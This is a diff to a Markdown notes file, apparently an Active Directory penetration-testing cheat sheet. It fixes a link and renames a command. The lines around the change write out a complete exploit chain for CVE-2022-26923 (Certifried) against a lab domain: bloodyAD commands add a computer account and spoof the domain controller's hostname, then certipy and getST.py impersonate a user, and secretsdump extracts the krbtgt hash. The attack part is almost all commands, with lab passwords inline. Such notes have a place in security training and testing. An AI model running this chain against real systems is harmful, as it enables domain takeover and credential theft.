@@ -8,7 +8,7 @@ impacket-secretsdump 'HOSTNAME$@IP'
 ```
 
 ## CVE-2022-26923 : Certifried
-More info in : https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html)
+More info in : https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html
 ```bash
 python3 bloodyAD.py -d crashlab.local -u testuser -p 'totoTOTOtoto1234*' --host 10.100.10.12 addComputer cve 'CVEPassword1234*'
 python3 bloodyAD.py -d crashlab.local -u testuser -p 'totoTOTOtoto1234*' --host 10.100.10.12 setAttribute 'CN=cve,CN=Computers,DC=crashlab,DC=local' dNSHostName '["CRASHDC.crashlab.local"]'
@@ -18,5 +18,5 @@ certipy auth -pfx ./crashdc.pfx -dc-ip 10.100.10.12 OR openssl pkcs12 -in crashd
 getST.py -spn LDAP/CRASHDC.CRASHLAB.LOCAL -impersonate emacron -dc-ip 10.100.10.12 'crashlab.local/cve$:CVEPassword1234*'                 
 cp emacron.ccache /tmp/
 export KRB5CCNAME=/tmp/emacron.ccache
-secretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt 'crashlab.local/emacron@crashdc.crashlab.local' -k -no-pass -dc-ip 10.100.10.12 -target-ip 10.100.10.12 
+impacket-secretsdump -user-status -just-dc-ntlm -just-dc-user krbtgt 'crashlab.local/emacron@crashdc.crashlab.local' -k -no-pass -dc-ip 10.100.10.12 -target-ip 10.100.10.12 
 ```
